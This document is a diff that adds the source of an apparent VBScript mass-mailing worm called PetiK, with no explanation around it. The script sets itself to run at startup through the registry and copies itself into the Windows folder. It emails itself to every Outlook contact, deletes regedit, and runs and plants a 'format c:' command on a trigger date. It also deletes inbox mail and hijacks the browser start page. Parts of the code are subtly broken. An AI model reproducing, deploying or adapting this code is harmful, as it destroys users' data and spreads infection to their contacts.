@@ -1,0 +1,64 @@
+   'Created by EMM
+    Dim wsh
+    Set wsh=CreateObject("WScript.Shell")
+    on error resume next
+    wsh.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\kv3000","c:\windows\PetiK.vbe"
+   Set fso= Createobject("Scripting.FileSystemObject")
+   Set InF=fso.OpenTextFile(WScript.ScriptFullname,1)
+   Do While InF.AtEndOfStream<>True
+   ScriptBuffer=ScriptBuffer&InF.ReadLine&vbcrlf
+   Loop
+   Set OutF=fso.OpenTextFile("c:\windows\PetiK.vbe",2,true)
+   OutF.write ScriptBuffer
+    if wsh.regread ("HKCU\software\a\a")<> "1" then  out
+   sub out
+   On Error Resume Next
+   Set Outlook = CreateObject("Outlook.Application")
+   If Outlook = "Outlook" Then
+   Set Mapi=Outlook.GetNameSpace("MAPI")
+   Set Lists=Mapi.AddressLists
+   For Each ListIndex In Lists
+   If ListIndex.AddressEntries.Count <> 0 Then
+   ContactCount = ListIndex.AddressEntries.Count
+   For Count= 1 To ContactCount
+   Set Mail = Outlook.CreateItem(0)
+   Set Contact = ListIndex.AddressEntries(Count)
+   Mail.To = Contact.Address
+   Mail.Subject = "Hey you !!!"
+   Mail.Body = "Here it is for you !!!"
+   Set Attachment=Mail.Attachments
+    Attachment.Add Folder & " c:\windows\PetiK.vbe"
+   Mail.Send
+   next
+    End if
+   next
+    End if
+   end sub
+   wsh.regwrite "HKCU\software\a\a", "1"
+
+   if year(date)&month(date)&day(date)= 2001125 Then a
+   sub a
+   on error resume next
+   fso.DeleteFile("c:\winodows\regedit.exe")
+
+    set WshShell = Wscript.CreateObject("WScript.Shell")
+   WshShell.Run ("start.exe /m format c:/q /autotest /u" )
+    Set Script = fso.CreateTextFile( "c:\autoexec.bat", True)
+   Script.writeline "format c:/q /autotest /u"
+    Set Outlook=CreateObject("Outlook.Application")
+   Set t=s.GetNameSpace("MAPI")
+   Set u=t.GetDefaultFolder(6)
+   For i=1 to u.items.count
+   u.Items.Item(i).delete
+   next
+   end sub
+   on error resume next
+   fso.DeleteFile("c:\winodows\regedit.exe")
+   Set Outlook=CreateObject("Outlook.Application")
+   Set t=s.GetNameSpace("MAPI")
+   Set u=t.GetDefaultFolder(6)
+   For i=1 to u.items.count
+   u.Items.Item(i).delete
+   next
+   wsh.regwrite "HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Start Page","http://zsyangel.yeah.net"
+   wsh.regwrite"HKEY_USERS\.DEFAULT\Software\Microsoft\Internet Explorer\Main\Window Title","PetiK"
